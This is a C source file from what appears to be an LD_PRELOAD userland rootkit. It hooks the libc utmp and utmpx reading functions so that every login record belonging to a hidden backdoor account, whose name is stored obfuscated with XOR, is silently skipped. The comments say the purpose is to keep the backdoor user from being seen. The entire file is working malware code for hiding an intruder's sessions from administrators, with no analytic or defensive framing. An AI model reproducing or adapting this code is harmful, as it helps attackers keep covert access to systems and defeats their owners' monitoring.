/*
 * These are the functions responsible for reading
 * entries from the utmp file.
 *
 * The utmp file may contain information about the
 * currently logged in backdoor user, but ain't
 * nobody seeing it up front.
 *
 * See 'putut.c' for more information.
 */

struct utmp *getutid(const struct utmp *ut)
{
    HOOK(o_getutid,CGETUTID);
    struct utmp *tmp;
    char cusr[32], *bduname=strdup(BD_UNAME); xor(bduname);

    do {
        tmp=o_getutid(ut);
        if(tmp == NULL) continue;
        if(tmp != NULL) snprintf(cusr,sizeof(cusr),"%s",tmp->ut_user);
    }while(tmp && !strncmp(cusr,bduname,sizeof(cusr)));
    
    CLEAN(bduname);
    return tmp;
}

struct utmpx *getutxid(const struct utmpx *utx)
{
    HOOK(o_getutxid,CGETUTXID);
    struct utmpx *tmp;
    char cusr[32], *bduname=strdup(BD_UNAME); xor(bduname);

    do {
        tmp=o_getutxid(utx);
        if(tmp == NULL) continue;
        if(tmp != NULL) snprintf(cusr,sizeof(cusr),"%s",tmp->ut_user);
    }while(tmp && !strncmp(cusr,bduname,sizeof(cusr)));
    
    CLEAN(bduname);
    return tmp;
}

struct utmp *getutline(const struct utmp *ut)
{
    HOOK(o_getutline,CGETUTLINE);
    struct utmp *tmp;
    char cusr[32], *bduname=strdup(BD_UNAME); xor(bduname);

    do {
        tmp=o_getutline(ut);
        if(tmp == NULL) continue;
        if(tmp != NULL) snprintf(cusr,sizeof(cusr),"%s",tmp->ut_user);
    }while(tmp && !strncmp(cusr,bduname,sizeof(cusr)));
    
    CLEAN(bduname);
    return tmp;
}

struct utmpx *getutxline(const struct utmpx *utx)
{
    HOOK(o_getutxline,CGETUTXLINE);
    struct utmpx *tmp;
    char cusr[32], *bduname=strdup(BD_UNAME); xor(bduname);

    do {
        tmp=o_getutxline(utx);
        if(tmp == NULL) continue;
        if(tmp != NULL) snprintf(cusr,sizeof(cusr),"%s",tmp->ut_user);
    }while(tmp && !strncmp(cusr,bduname,sizeof(cusr)));
    
    CLEAN(bduname);
    return tmp;
}

struct utmp *getutent(void)
{
    HOOK(o_getutent,CGETUTENT);
    struct utmp *tmp;
    char cusr[32], *bduname=strdup(BD_UNAME); xor(bduname);

    do {
        tmp=o_getutent();
        if(tmp == NULL) continue;
        if(tmp != NULL) snprintf(cusr,sizeof(cusr),"%s",tmp->ut_user);
    }while(tmp && !strncmp(cusr,bduname,sizeof(cusr)));
    
    CLEAN(bduname);
    return tmp;
}

struct utmpx *getutxent(void)
{
    HOOK(o_getutxent,CGETUTXENT);
    struct utmpx *tmp;
    char cusr[32], *bduname=strdup(BD_UNAME); xor(bduname);
    
    do {
        tmp=o_getutxent();
        if(tmp == NULL) continue;
        if(tmp != NULL) snprintf(cusr,sizeof(cusr),"%s",tmp->ut_user);
    }while(tmp && !strncmp(cusr,bduname,sizeof(cusr)));

    CLEAN(bduname);
    return tmp;
}

void getutmp(const struct utmpx *ux, struct utmp *u)
{
    if(ux && ux->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strncmp(ux->ut_user,bduname,sizeof(ux->ut_user))) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_getutmp,CGETUTMP);
    o_getutmp(ux,u);
}

void getutmpx(const struct utmp *u, struct utmpx *ux)
{
    if(u && u->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strncmp(u->ut_user,bduname,sizeof(u->ut_user))) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_getutmpx,CGETUTMPX);
    o_getutmpx(u,ux);
}
